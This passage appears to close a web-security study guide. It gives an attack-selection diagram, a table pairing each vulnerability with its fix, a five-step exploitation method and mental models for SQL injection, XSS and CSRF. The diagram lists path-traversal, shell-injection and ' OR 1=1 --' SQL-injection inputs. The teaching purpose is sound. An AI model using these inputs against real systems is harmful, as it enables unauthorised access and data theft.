**Key insight:** HttpOnly cookie can't be read; make admin send request with it (cross-origin won't send to attacker, so observe server logs).

---

## 🗺️ Master Attack Selection Diagram

```
                          Start
                            │
        ┌───────────────────┼────────────────────┐
        ▼                   ▼                    ▼
   Filesystem?          Shell?              Database?
        │                   │                    │
        ▼                   ▼                    ▼
      ../              ; && || | ' OR 1=1 --
        │                   │                    │
        ▼                   ▼                    ▼
   Path Traversal     Cmd Injection      SQL Injection
                                              │
                                    ┌─────────┴─────────┐
                                    ▼                   ▼
                                 UNION              Blind
                              (stack SELECT)   (boolean/time)
```

## 🗺️ Vulnerability Summary

| Vulnerability | Boundary | Fix |
|---------------|----------|-----|
| Path Traversal | App↔FS | `os.path.abspath()` check |
| Cmd Injection | App↔Shell | `subprocess.run([...])` |
| SQL Injection | App↔DB | Parameterized queries |
| Auth Bypass (URL) | App↔Client | Server sessions |
| Auth Bypass (Cookie) | App↔Client | Signed cookies |
| XSS Stored | App↔Browser | Output escaping |
| XSS Reflected | App↔Browser | `html.escape()` |
| CSRF | Browser↔Server | CSRF tokens, SameSite |

---

# 🎓 LEARNING STRATEGY

## 🗺️ The 5-Step Method

```
   1. READ code      → understand intent
        │
   2. MAP boundary   → what trusts what?
        │
   3. FIND gap       → what's not validated?
        │
   4. CRAFT input    → exploit the gap
        │
   5. VERIFY         → strace, gdb, logs
```

## 🗺️ Debug Decision Tree

```
   Failed?
      │
      ├─ Input wrong? ──▶ echo / xxd / base64 -d
      ├─ Format wrong? ──▶ file / cat / read parser
      ├─ Network wrong? ──▶ tshark / curl -v / nc
      └─ Logic wrong? ──▶ gdb / strace / print state
```

## 🧠 Mental Models

| Concept | Mental Model |
|---------|--------------|
| Absolute path | Start at `/` |
| Relative path | Start at CWD |
| Glob | Shell expands wildcards |
| Pipe | Conveyor belt |
| Redirect | Change belt destination |
| Export | Promote variable to environment |
| PATH | Search list for bare commands |
| SUID | Run with owner's privileges |
| SQL injection | Break string, add logic |
| UNION | Stack two SELECTs |
| Blind SQL | 20 questions |
| XSS | Inject HTML/JS |
| CSRF | Forge request with cookies |
| HttpOnly | JS can't read; only send |

---

## 🎉 Complete

You now have comprehensive coverage of:
- **Module 1:** 15 Linux topics (paths → destruction)
- **Module 2:** 10 SQL query topics
- **Module 3:** 36 HTTP topics (methods, headers, cookies, redirects, JS)
- **Module 4:** 19 encoding topics (hex, base64, UTF-8, UTF-16, obfuscation)
- **Module 5:** 19 web exploitation topics (path traversal, command injection, auth bypass, SQL injection, blind SQL, XSS, CSRF)

**The universal rule:** *Every trust boundary is a vulnerability. Every parser is an escape route.*

Happy hacking! 🚀
